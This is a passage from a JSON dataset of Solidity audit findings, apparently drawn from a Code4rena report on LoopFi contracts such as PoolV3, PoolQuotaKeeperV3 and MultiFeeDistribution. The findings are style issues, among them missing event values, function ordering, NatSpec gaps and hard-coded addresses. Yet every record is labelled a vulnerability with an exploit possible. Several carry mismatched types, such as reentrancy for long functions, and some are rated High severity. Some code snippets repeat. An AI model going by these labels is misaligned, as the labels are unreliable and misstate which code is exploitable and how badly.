    "code": "solidity\nFile: src/PoolV3.sol\n\n746:     function setInterestRateModel(\n             address newInterestRateModel\n         )\n             external\n             override\n             configuratorOnly // U:[LP-2C]\n             nonZeroAddress(newInterestRateModel) // U:[LP-22A]\n         {\n             interestRateModel = newInterestRateModel; // U:[LP-22B]\n             _updateBaseInterest(0, 0, false); // U:[LP-22B]\n             emit SetInterestRateModel(newInterestRateModel); // U:[LP-22B]\n\n761:     function setPoolQuotaKeeper(\n             address newPoolQuotaKeeper\n         )\n             external\n             override\n             configuratorOnly // U:[LP-2C]\n             nonZeroAddress(newPoolQuotaKeeper) // U:[LP-23A]\n         {\n             if (IPoolQuotaKeeperV3(newPoolQuotaKeeper).pool() != address(this)) {\n                 revert IncompatiblePoolQuotaKeeperException(); // U:[LP-23C]\n             }\n     \n             poolQuotaKeeper = newPoolQuotaKeeper; // U:[LP-23D]\n     \n             uint256 newQuotaRevenue = IPoolQuotaKeeperV3(poolQuotaKeeper).poolQuotaRevenue();\n             _setQuotaRevenue(newQuotaRevenue); // U:[LP-23D]\n     \n             emit SetPoolQuotaKeeper(newPoolQuotaKeeper); // U:[LP-23D]\n\n797:     function setCreditManagerDebtLimit(\n             address creditManager,\n             uint256 newLimit\n         )\n             external\n             override\n             controllerOnly // U:[LP-2C]\n             nonZeroAddress(creditManager) // U:[LP-25A]\n         {\n             if (!_creditManagerSet.contains(creditManager)) {\n                 if (address(this) != ICreditManagerV3(creditManager).pool()) {\n                     revert IncompatibleCreditManagerException(); // U:[LP-25C]\n                 }\n                 _creditManagerSet.add(creditManager); // U:[LP-25D]\n                 emit AddCreditManager(creditManager); // U:[LP-25D]\n             }\n             _creditManagerDebt[creditManager].limit = _convertToU128(newLimit); // U:[LP-25D]\n             emit SetCreditManagerDebtLimit(creditManager, newLimit); // U:[LP-25D]\n\n797:     function setCreditManagerDebtLimit(\n             address creditManager,\n             uint256 newLimit\n         )\n             external\n             override\n             controllerOnly // U:[LP-2C]\n             nonZeroAddress(creditManager) // U:[LP-25A]\n         {\n             if (!_creditManagerSet.contains(creditManager)) {\n                 if (address(this) != ICreditManagerV3(creditManager).pool()) {\n                     revert IncompatibleCreditManagerException(); // U:[LP-25C]\n                 }\n                 _creditManagerSet.add(creditManager); // U:[LP-25D]\n                 emit AddCreditManager(creditManager); // U:[LP-25D]\n\n819:     function setWithdrawFee(\n             uint256 newWithdrawFee\n         )\n             external\n             override\n             controllerOnly // U:[LP-2C]\n         {\n             if (newWithdrawFee > MAX_WITHDRAW_FEE) {\n                 revert IncorrectParameterException(); // U:[LP-26A]\n             }\n             if (newWithdrawFee == withdrawFee) return;\n     \n             withdrawFee = newWithdrawFee.toUint16(); // U:[LP-26B]\n             emit SetWithdrawFee(newWithdrawFee); // U:[LP-26B]\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "access_control",
    "severity": "High",
    "title": "<a name=\"NC-14\"></a>[NC-14] Events that mark critical parameter changes should contain both the old and the new value",
    "description": "This should especially be done if the new value is not required to be different from the old value *Instances (29)*: File: src/CDPVault.sol 195:     function setParameter(bytes32 parameter, uint256 data) external whenNotPaused onlyRole(VAULT_CONFIG_ROLE) { if (parameter == \"debtFloor\") vaultConfig.debtFloor = uint128(data);",
    "confidence": 0.9,
    "source": "code4rena",
    "repository": "2024-07-loopfi",
    "audit_source": "code4rena",
    "lines_of_code": 85,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 1.0,
    "vulnerability_types": [
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": true,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "solidity\nFile: src/PoolV3.sol\n\n1: \n   Current order:\n   internal _revertIfCallerIsNotPoolQuotaKeeper\n   internal _revertIfCallerNotCreditManager\n   internal _revertIfLocked\n   public decimals\n   external creditManagers\n   public availableLiquidity\n   public expectedLiquidity\n   public expectedLiquidityLU\n   public totalAssets\n   public deposit\n   external depositWithReferral\n   public mint\n   external mintWithReferral\n   public withdraw\n   public redeem\n   public previewDeposit\n   public previewMint\n   public previewWithdraw\n   public previewRedeem\n   public maxDeposit\n   public maxMint\n   public maxWithdraw\n   public maxRedeem\n   internal _deposit\n   internal _withdraw\n   internal _convertToShares\n   internal _convertToAssets\n   external totalBorrowed\n   external totalDebtLimit\n   external creditManagerBorrowed\n   external creditManagerDebtLimit\n   external creditManagerBorrowable\n   external lendCreditAccount\n   external repayCreditAccount\n   internal _borrowable\n   public baseInterestRate\n   external supplyRate\n   public baseInterestIndex\n   external baseInterestIndexLU\n   internal _calcBaseInterestAccrued\n   external calcAccruedQuotaInterest\n   internal _updateBaseInterest\n   private _calcBaseInterestAccrued\n   private _calcBaseInterestIndex\n   public quotaRevenue\n   external updateQuotaRevenue\n   external setQuotaRevenue\n   internal _calcQuotaRevenueAccrued\n   internal _setQuotaRevenue\n   private _calcQuotaRevenueAccrued\n   external setInterestRateModel\n   external setPoolQuotaKeeper\n   external setTotalDebtLimit\n   external setCreditManagerDebtLimit\n   external setWithdrawFee\n   external setAllowed\n   external setLock\n   external isAllowed\n   internal _setTotalDebtLimit\n   internal _amountWithFee\n   internal _amountMinusFee\n   internal _amountWithWithdrawalFee\n   internal _amountMinusWithdrawalFee\n   internal _convertToU256\n   internal _convertToU128\n   external mintProfit\n   \n   Suggested order:\n   external creditManagers\n   external depositWithReferral\n   external mintWithReferral\n   external totalBorrowed\n   external totalDebtLimit\n   external creditManagerBorrowed\n   external creditManagerDebtLimit\n   external creditManagerBorrowable\n   external lendCreditAccount\n   external repayCreditAccount\n   external supplyRate\n   external baseInterestIndexLU\n   external calcAccruedQuotaInterest\n   external updateQuotaRevenue\n   external setQuotaRevenue\n   external setInterestRateModel\n   external setPoolQuotaKeeper\n   external setTotalDebtLimit\n   external setCreditManagerDebtLimit\n   external setWithdrawFee\n   external setAllowed\n   external setLock\n   external isAllowed\n   external mintProfit\n   public decimals\n   public availableLiquidity\n   public expectedLiquidity\n   public expectedLiquidityLU\n   public totalAssets\n   public deposit\n   public mint\n   public withdraw\n   public redeem\n   public previewDeposit\n   public previewMint\n   public previewWithdraw\n   public previewRedeem\n   public maxDeposit\n   public maxMint\n   public maxWithdraw\n   public maxRedeem\n   public baseInterestRate\n   public baseInterestIndex\n   public quotaRevenue\n   internal _revertIfCallerIsNotPoolQuotaKeeper\n   internal _revertIfCallerNotCreditManager\n   internal _revertIfLocked\n   internal _deposit\n   internal _withdraw\n   internal _convertToShares\n   internal _convertToAssets\n   internal _borrowable\n   internal _calcBaseInterestAccrued\n   internal _updateBaseInterest\n   internal _calcQuotaRevenueAccrued\n   internal _setQuotaRevenue\n   internal _setTotalDebtLimit\n   internal _amountWithFee\n   internal _amountMinusFee\n   internal _amountWithWithdrawalFee\n   internal _amountMinusWithdrawalFee\n   internal _convertToU256\n   internal _convertToU128\n   private _calcBaseInterestAccrued\n   private _calcBaseInterestIndex\n   private _calcQuotaRevenueAccrued\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "access_control",
    "severity": "Low",
    "title": "<a name=\"NC-15\"></a>[NC-15] Function ordering does not follow the Solidity style guide",
    "description": "According to the [Solidity style guide](https://docs.soliditylang.org/en/v0.8.17/style-guide.html#order-of-functions), functions should be laid out in the following order :`constructor()`, `receive()`, `fallback()`, `external`, `public`, `internal`, `private`, but the cases below do not follow this pattern *Instances (17)*: File: src/CDPVault.sol 1: Current order:",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-07-loopfi",
    "audit_source": "code4rena",
    "lines_of_code": 141,
    "has_external_calls": true,
    "has_state_changes": false,
    "complexity_score": 1.0,
    "vulnerability_types": [
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "solidity\nFile: src/PoolV3.sol\n\n130:     function _revertIfCallerIsNotPoolQuotaKeeper() internal view {\n\n135:     function _revertIfCallerNotCreditManager() internal view {\n\n192:     function decimals() public view override(ERC20, ERC4626, IERC20Metadata) returns (uint8) {\n\n197:     function creditManagers() external view override returns (address[] memory) {\n\n202:     function availableLiquidity() public view override returns (uint256) {\n\n208:     function expectedLiquidity() public view override returns (uint256) {\n\n213:     function expectedLiquidityLU() public view override returns (uint256) {\n\n223:     function totalAssets() public view override(ERC4626, IERC4626) returns (uint256 assets) {\n\n336:     function previewDeposit(uint256 assets) public view override(ERC4626, IERC4626) returns (uint256 shares) {\n\n341:     function previewMint(uint256 shares) public view override(ERC4626, IERC4626) returns (uint256) {\n\n346:     function previewWithdraw(uint256 assets) public view override(ERC4626, IERC4626) returns (uint256) {\n\n351:     function previewRedeem(uint256 shares) public view override(ERC4626, IERC4626) returns (uint256) {\n\n356:     function maxDeposit(address) public view override(ERC4626, IERC4626) returns (uint256) {\n\n361:     function maxMint(address) public view override(ERC4626, IERC4626) returns (uint256) {\n\n366:     function maxWithdraw(address owner) public view override(ERC4626, IERC4626) returns (uint256) {\n\n376:     function maxRedeem(address owner) public view override(ERC4626, IERC4626) returns (uint256) {\n\n384:     function _deposit(address receiver, uint256 assetsSent, uint256 assetsReceived, uint256 shares) internal {\n\n429:     function _convertToShares(uint256 assets) internal pure returns (uint256 shares) {\n\n436:     function _convertToAssets(uint256 shares) internal pure returns (uint256 assets) {\n\n446:     function totalBorrowed() external view override returns (uint256) {\n\n451:     function totalDebtLimit() external view override returns (uint256) {\n\n456:     function creditManagerBorrowed(address creditManager) external view override returns (uint256) {\n\n461:     function creditManagerDebtLimit(address creditManager) external view override returns (uint256) {\n\n466:     function creditManagerBorrowable(address creditManager) external view override returns (uint256 borrowable) {\n\n579:     function _borrowable(DebtParams storage debt) internal view returns (uint256) {\n\n596:     function baseInterestRate() public view override returns (uint256) {\n\n603:     function supplyRate() external view override returns (uint256) {\n\n614:     function baseInterestIndex() public view override returns (uint256) {\n\n621:     function baseInterestIndexLU() external view override returns (uint256) {\n\n626:     function _calcBaseInterestAccrued() internal view returns (uint256) {\n\n632:     function calcAccruedQuotaInterest() external view returns (uint256) {\n\n671:     function _calcBaseInterestAccrued(uint256 timestamp) private view returns (uint256) {\n\n676:     function _calcBaseInterestIndex(uint256 timestamp) private view returns (uint256) {\n\n685:     function quotaRevenue() public view override returns (uint256) {\n\n717:     function _calcQuotaRevenueAccrued() internal view returns (uint256) {\n\n726:     function _setQuotaRevenue(uint256 newQuotaRevenue) internal {\n\n736:     function _calcQuotaRevenueAccrued(uint256 timestamp) private view returns (uint256) {\n\n838:     function setAllowed(address account, bool status) external controllerOnly {\n\n844:     function setLock(bool status) external controllerOnly {\n\n850:     function isAllowed(address account) external view returns (bool) {\n\n855:     function _setTotalDebtLimit(uint256 limit) internal {\n\n869:     function _amountWithFee(uint256 amount) internal view virtual returns (uint256) {\n\n875:     function _amountMinusFee(uint256 amount) internal view virtual returns (uint256) {\n\n880:     function _amountWithWithdrawalFee(uint256 amount) internal view returns (uint256) {\n\n885:     function _amountMinusWithdrawalFee(uint256 amount) internal view returns (uint256) {\n\n890:     function _convertToU256(uint128 limit) internal pure returns (uint256) {\n\n895:     function _convertToU128(uint256 limit) internal pure returns (uint128) {\n\n899:     function mintProfit(uint256 amount) external creditManagerOnly {\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "reentrancy",
    "severity": "Low",
    "title": "<a name=\"NC-16\"></a>[NC-16] Functions should not be longer than 50 lines",
    "description": "Overly complex code can make understanding functionality more difficult, try to further modularize your code to ensure readability *Instances (270)*: File: src/CDPVault.sol 25:     function enter(address user, uint256 amount) external; 27:     function exit(address user, uint256 amount) external;",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-07-loopfi",
    "audit_source": "code4rena",
    "lines_of_code": 100,
    "has_external_calls": true,
    "has_state_changes": false,
    "complexity_score": 1.0,
    "vulnerability_types": [
      1,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "\n\n[Link to code](https://github.com/code-423n4/2024-07-loopfi/blob/main/src/vendor/IAuraPool.sol)\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "other",
    "severity": "Low",
    "title": "<a name=\"NC-19\"></a>[NC-19] Interfaces should be defined in separate files from their usage",
    "description": "The interfaces below should be defined in separate files, so that it's easier for future projects to import them, and to avoid duplication later on if they need to be used elsewhere in the project *Instances (3)*: File: src/CDPVault.sol 22: interface IPoolV3Loop is IPoolV3 { [Link to code](https://github.com/code-423n4/2024-07-loopfi/blob/main/src/CDPVault.sol)",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-07-loopfi",
    "audit_source": "code4rena",
    "lines_of_code": 5,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.099,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "solidity\nFile: src/quotas/PoolQuotaKeeperV3.sol\n\n183:     function updateRates()\n             external\n             override\n             gaugeOnly // U:[PQK-3]\n         {\n             address[] memory tokens = quotaTokensSet.values();\n             uint16[] memory rates = IGaugeV3(gauge).getRates(tokens); // U:[PQK-7]\n     \n             uint256 quotaRevenue; // U:[PQK-7]\n             uint256 timestampLU = lastQuotaRateUpdate;\n             uint256 len = tokens.length;\n     \n             for (uint256 i; i < len; ) {\n                 address token = tokens[i];\n                 uint16 rate = rates[i];\n     \n                 TokenQuotaParams storage tokenQuotaParams = totalQuotaParams[token]; // U:[PQK-7]\n                 (uint16 prevRate, uint192 tqCumulativeIndexLU, ) = _getTokenQuotaParamsOrRevert(tokenQuotaParams);\n     \n                 tokenQuotaParams.cumulativeIndexLU = QuotasLogic.cumulativeIndexSince(\n                     tqCumulativeIndexLU,\n                     prevRate,\n                     timestampLU\n                 ); // U:[PQK-7]\n     \n                 tokenQuotaParams.rate = rate; // U:[PQK-7]\n     \n                 quotaRevenue += (IPoolV3(pool).creditManagerBorrowed(creditManagers[token]) * rate) / PERCENTAGE_FACTOR; // U:[PQK-7]\n     \n                 emit UpdateTokenQuotaRate(token, rate); // U:[PQK-7]\n     \n                 unchecked {\n                     ++i;\n                 }\n             }\n     \n             IPoolV3(pool).setQuotaRevenue(quotaRevenue); // U:[PQK-7]\n             lastQuotaRateUpdate = uint40(block.timestamp); // U:[PQK-7]\n\n238:     function setCreditManager(\n             address token,\n             address vault\n         )\n             external\n             override\n             configuratorOnly // U:[PQK-2]\n         {\n             creditManagers[token] = vault;\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "reentrancy",
    "severity": "Low",
    "title": "<a name=\"NC-20\"></a>[NC-20] Lack of checks in setters",
    "description": "Be it sanity checks (like checks against `0`-values) or initial setting checks: it's best for Setter functions to have them *Instances (16)*: File: src/PoolV3.sol 691:     function updateQuotaRevenue( int256 quotaRevenueDelta",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-07-loopfi",
    "audit_source": "code4rena",
    "lines_of_code": 53,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 1.0,
    "vulnerability_types": [
      1,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "solidity\nFile: src/quotas/GaugeV3.sol\n\n17: import {CallerNotVoterException, IncorrectParameterException, TokenNotAllowedException, InsufficientVotesException} from \"@gearbox-protocol/core-v3/contracts/interfaces/IExceptions.sol\";\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "Low",
    "title": "<a name=\"NC-21\"></a>[NC-21] Lines are too long",
    "description": "Usually lines in source code are limited to [80](https://softwareengineering.stackexchange.com/questions/148677/why-is-80-characters-the-standard-limit-for-code-width) characters. Today's screens are much larger so it's reasonable to stretch this in some cases. Since the files will most likely reside in GitHub, and GitHub starts using a scroll bar in all cases when the length is over [164](https://github.com/aizatto/character-length) characters, the lines below should be split when they reach that length *Instances (1)*: File: src/quotas/GaugeV3.sol 17: import {CallerNotVoterException, IncorrectParameterException, TokenNotAllowedException, InsufficientVotesException} from \"@gearbox-protocol/core-v3/contracts/interfaces/IExceptions.sol\"; [Link to code](https://github.com/code-423n4/2024-07-loopfi/blob/main/src/quotas/GaugeV3.sol)",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-07-loopfi",
    "audit_source": "code4rena",
    "lines_of_code": 6,
    "has_external_calls": true,
    "has_state_changes": false,
    "complexity_score": 0.231,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "solidity\nFile: src/reward/MultiFeeDistribution.sol\n\n266:     function setMinters(address[] calldata minters_) external onlyOwner {\n             uint256 length = minters_.length;\n             for (uint256 i; i < length; ) {\n                 if (minters_[i] == address(0)) revert AddressZero();\n                 minters[minters_[i]] = true;\n                 unchecked {\n                     i++;\n                 }\n             }\n             mintersAreSet = true;\n\n404:     function setDefaultRelockTypeIndex(uint256 index) external {\n             if (index >= _lockPeriod.length) revert InvalidType();\n             defaultLockIndex[msg.sender] = index;\n\n414:     function setAutocompound(bool status, uint256 slippage) external {\n             autocompoundEnabled[msg.sender] = status;\n             if (slippage < MAX_SLIPPAGE || slippage >= PERCENT_DIVISOR) {\n                 revert InvalidAmount();\n             }\n             userSlippage[msg.sender] = slippage;\n\n426:     function setUserSlippage(uint256 slippage) external {\n             if (slippage < MAX_SLIPPAGE || slippage >= PERCENT_DIVISOR) {\n                 revert InvalidAmount();\n             }\n             userSlippage[msg.sender] = slippage;\n\n452:     function setLookback(uint256 lookback) external onlyOwner {\n             if (lookback == uint256(0)) revert AmountZero();\n             if (lookback > rewardsDuration) revert InvalidLookback();\n     \n             rewardsLookback = lookback;\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "reentrancy",
    "severity": "High",
    "title": "<a name=\"NC-22\"></a>[NC-22] Missing Event for critical parameters change",
    "description": "Events help non-contract tools to track changes, and events prevent users from being surprised by changes. *Instances (18)*: File: src/PoolV3.sol 691:     function updateQuotaRevenue( int256 quotaRevenueDelta",
    "confidence": 0.9,
    "source": "code4rena",
    "repository": "2024-07-loopfi",
    "audit_source": "code4rena",
    "lines_of_code": 38,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 1.0,
    "vulnerability_types": [
      1,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": true,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "solidity\nFile: src/proxy/PositionAction.sol\n\n185:     /// @notice Adds collateral to a CDP Vault\n         /// @param position The CDP Vault position\n         /// @param vault The CDP Vault\n         /// @param collateralParams The collateral parameters\n         function deposit(\n             address position,\n             address vault,\n             CollateralParams calldata collateralParams,\n             PermitParams calldata permitParams\n\n232:     /// @notice Adds collateral and debt to a CDP Vault\n         /// @param position The CDP Vault position\n         /// @param vault The CDP Vault\n         /// @param collateralParams The collateral parameters\n         /// @param creditParams The credit parameters\n         function depositAndBorrow(\n             address position,\n             address vault,\n             CollateralParams calldata collateralParams,\n             CreditParams calldata creditParams,\n             PermitParams calldata permitParams\n\n377:     /// @notice Callback function for the flash loan taken out in increaseLever\n         /// @param data The encoded bytes that were passed into the flash loan\n         function onFlashLoan(\n             address /*initiator*/,\n             address /*token*/,\n             uint256 amount,\n             uint256 fee,\n             bytes calldata data\n\n429:     /// @notice Callback function for the credit flash loan taken out in decreaseLever\n         /// @param data The encoded bytes that were passed into the credit flash loan\n         function onCreditFlashLoan(\n             address /*initiator*/,\n             uint256 /*amount*/,\n             uint256 /*fee*/,\n             bytes calldata data\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "access_control",
    "severity": "Low",
    "title": "<a name=\"NC-24\"></a>[NC-24] Incomplete NatSpec: `@param` is missing on actually documented functions",
    "description": "The following functions are missing `@param` NatSpec comments. *Instances (12)*: File: src/PoolV3.sol 247:     /// @dev Same as `deposit`, but allows to specify the referral code function depositWithReferral(",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-07-loopfi",
    "audit_source": "code4rena",
    "lines_of_code": 43,
    "has_external_calls": true,
    "has_state_changes": false,
    "complexity_score": 1.0,
    "vulnerability_types": [
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "solidity\nFile: src/proxy/PositionAction.sol\n\n377:     /// @notice Callback function for the flash loan taken out in increaseLever\n         /// @param data The encoded bytes that were passed into the flash loan\n         function onFlashLoan(\n             address /*initiator*/,\n             address /*token*/,\n             uint256 amount,\n             uint256 fee,\n             bytes calldata data\n         ) external returns (bytes32) {\n\n429:     /// @notice Callback function for the credit flash loan taken out in decreaseLever\n         /// @param data The encoded bytes that were passed into the credit flash loan\n         function onCreditFlashLoan(\n             address /*initiator*/,\n             uint256 /*amount*/,\n             uint256 /*fee*/,\n             bytes calldata data\n         ) external returns (bytes32) {\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "Low",
    "title": "<a name=\"NC-25\"></a>[NC-25] Incomplete NatSpec: `@return` is missing on actually documented functions",
    "description": "The following functions are missing `@return` NatSpec comments. *Instances (9)*: File: src/PoolV3.sol 247:     /// @dev Same as `deposit`, but allows to specify the referral code function depositWithReferral(",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-07-loopfi",
    "audit_source": "code4rena",
    "lines_of_code": 23,
    "has_external_calls": true,
    "has_state_changes": false,
    "complexity_score": 0.827,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "solidity\nFile: src/reward/MultiFeeDistribution.sol\n\n349:         if (!minters[msg.sender]) revert InsufficientPermission();\n\n366:         if (!minters[msg.sender]) revert InsufficientPermission();\n\n497:         if (!minters[msg.sender]) revert InsufficientPermission();\n\n690:         if (msg.sender != _lockZap) revert InsufficientPermission();\n\n726:         if (msg.sender != rewardConverter) revert InsufficientPermission();\n\n762:         requalifyFor(msg.sender);\n\n844:         if (msg.sender != address(bountyManager)) revert InsufficientPermission();\n\n1282:         if (onBehalfOf != msg.sender) revert InsufficientPermission();\n\n1357:         if (isRelockAction && address_ != msg.sender && _lockZap != msg.sender) revert InsufficientPermission();\n\n1369:         if (isRelockAction || (address_ != msg.sender && !autoRelockDisabled[address_])) {\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "access_control",
    "severity": "Low",
    "title": "<a name=\"NC-27\"></a>[NC-27] Use a `modifier` instead of a `require/if` statement for a special `msg.sender` actor",
    "description": "If a function is supposed to be access-controlled, a `modifier` should be used instead of a `require/if` statement for more readability. *Instances (34)*: File: src/Flashlender.sol 101:         if (receiver.onFlashLoan(msg.sender, token, amount, fee, data) != CALLBACK_SUCCESS) 129:         if (receiver.onCreditFlashLoan(msg.sender, amount, fee, data) != CALLBACK_SUCCESS_CREDIT)",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-07-loopfi",
    "audit_source": "code4rena",
    "lines_of_code": 24,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 0.853,
    "vulnerability_types": [
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "solidity\nFile: src/reward/MultiFeeDistribution.sol\n\n87:     mapping(address => Balances) private _balances;\n\n88:     mapping(address => LockedBalance[]) internal _userLocks;\n\n89:     mapping(address => LockedBalance[]) private _userEarnings;\n\n90:     mapping(address => bool) public autocompoundEnabled;\n\n91:     mapping(address => uint256) public lastAutocompound;\n\n111:     mapping(address => Reward) public rewardData;\n\n114:     mapping(address => mapping(address => uint256)) public userRewardPerTokenPaid;\n\n117:     mapping(address => mapping(address => uint256)) public rewards;\n\n128:     mapping(address => bool) public minters;\n\n131:     mapping(address => bool) public autoRelockDisabled;\n\n134:     mapping(address => uint256) public defaultLockIndex;\n\n140:     mapping(address => uint256) public lastClaimTime;\n\n146:     mapping(address => uint256) public userSlippage;\n\n155:     mapping(address => bool) public isRewardToken;\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "price_manipulation",
    "severity": "Low",
    "title": "<a name=\"NC-29\"></a>[NC-29] Consider using named mappings",
    "description": "Consider moving to solidity version 0.8.18 or later, and using [named mappings](https://ethereum.stackexchange.com/questions/51629/how-to-name-the-arguments-in-mapping/145555#145555) to make it easier to understand the purpose of each mapping *Instances (33)*: File: src/CDPVault.sol 106:     mapping(address => Position) public positions; [Link to code](https://github.com/code-423n4/2024-07-loopfi/blob/main/src/CDPVault.sol)",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-07-loopfi",
    "audit_source": "code4rena",
    "lines_of_code": 32,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.938,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      1,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "solidity\nFile: src/vendor/AuraVault.sol\n\n50:     address private constant BAL = 0xba100000625a3754423978a60c9317c58a424e3D;\n\n52:     address private constant BAL_CHAINLINK_FEED = 0xdF2917806E30300537aEB49A7663062F4d1F2b5F;\n\n55:     address private constant ETH_CHAINLINK_FEED = 0x5f4eC3Df9cbd43714FE2740f5E3616155c5b8419;\n\n59:     address private constant AURA = 0xC0c293ce456fF0ED870ADd98a0828Dd4d2903DBF;\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "Low",
    "title": "<a name=\"NC-30\"></a>[NC-30] `address`s shouldn't be hard-coded",
    "description": "It is often better to declare `address`es as `immutable`, and assign them via constructor arguments. This allows the code to remain the same across deployments on different networks, and avoids recompilation when addresses need to change. *Instances (5)*: File: src/proxy/TransferAction.sol 39:     address public constant permit2 = 0x000000000022D473030F116dDEE9F6B43aC78BA3; [Link to code](https://github.com/code-423n4/2024-07-loopfi/blob/main/src/proxy/TransferAction.sol)",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-07-loopfi",
    "audit_source": "code4rena",
    "lines_of_code": 12,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.408,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "solidity\nFile: src/reward/MultiFeeDistribution.sol\n\n684:     /**\n          * @notice Zap vesting RDNT tokens to LP\n          * @param user address\n          * @return zapped amount\n          */\n         function zapVestingToLp(address user) external returns (uint256 zapped) {\n             if (msg.sender != _lockZap) revert InsufficientPermission();\n     \n             _updateReward(user);\n     \n             uint256 currentTimestamp = block.timestamp;\n             LockedBalance[] storage earnings = _userEarnings[user];\n             for (uint256 i = earnings.length; i > 0; ) {\n                 if (earnings[i - 1].unlockTime > currentTimestamp) {\n                     zapped = zapped + earnings[i - 1].amount;\n                     earnings.pop();\n                 } else {\n                     break;\n                 }\n                 unchecked {\n                     i--;\n                 }\n             }\n     \n             rdntToken.safeTransfer(_lockZap, zapped);\n     \n             Balances storage bal = _balances[user];\n             bal.earned = bal.earned - zapped;\n             bal.total = bal.total - zapped;\n     \n             IPriceProvider(_priceProvider).update();\n     \n             return zapped;\n\n836:     /**\n          * @notice Claims bounty.\n          * @dev Remove expired locks\n          * @param user address\n          * @param execute true if this is actual execution\n          * @return issueBaseBounty true if needs to issue base bounty\n          */\n         function claimBounty(address user, bool execute) public whenNotPaused returns (bool issueBaseBounty) {\n             if (msg.sender != address(bountyManager)) revert InsufficientPermission();\n     \n             (, uint256 unlockable, , , ) = lockedBalances(user);\n             if (unlockable == 0) {\n                 return (false);\n\n836:     /**\n          * @notice Claims bounty.\n          * @dev Remove expired locks\n          * @param user address\n          * @param execute true if this is actual execution\n          * @return issueBaseBounty true if needs to issue base bounty\n          */\n         function claimBounty(address user, bool execute) public whenNotPaused returns (bool issueBaseBounty) {\n             if (msg.sender != address(bountyManager)) revert InsufficientPermission();\n     \n             (, uint256 unlockable, , , ) = lockedBalances(user);\n             if (unlockable == 0) {\n                 return (false);\n             } else {\n                 issueBaseBounty = true;\n             }\n     \n             if (!execute) {\n                 return (issueBaseBounty);\n\n954:     /**\n          * @notice Earnings which are vesting, and earnings which have vested for full duration.\n          * @dev Earned balances may be withdrawn immediately, but will incur a penalty between 25-90%, based on a linear schedule of elapsed time.\n          * @return totalVesting sum of vesting tokens\n          * @return unlocked earnings\n          * @return earningsData which is an array of all infos\n          */\n         function earnedBalances(\n             address user\n         ) public view returns (uint256 totalVesting, uint256 unlocked, EarnedBalance[] memory earningsData) {\n             unlocked = _balances[user].unlocked;\n             LockedBalance[] storage earnings = _userEarnings[user];\n             uint256 idx;\n             uint256 length = earnings.length;\n             uint256 currentTimestamp = block.timestamp;\n             for (uint256 i; i < length; ) {\n                 if (earnings[i].unlockTime > currentTimestamp) {\n                     if (idx == 0) {\n                         earningsData = new EarnedBalance[](earnings.length - i);\n                     }\n                     (, uint256 penaltyAmount, , ) = _ieeWithdrawableBalance(user, earnings[i].unlockTime);\n                     earningsData[idx].amount = earnings[i].amount;\n                     earningsData[idx].unlockTime = earnings[i].unlockTime;\n                     earningsData[idx].penalty = penaltyAmount;\n                     idx++;\n                     totalVesting 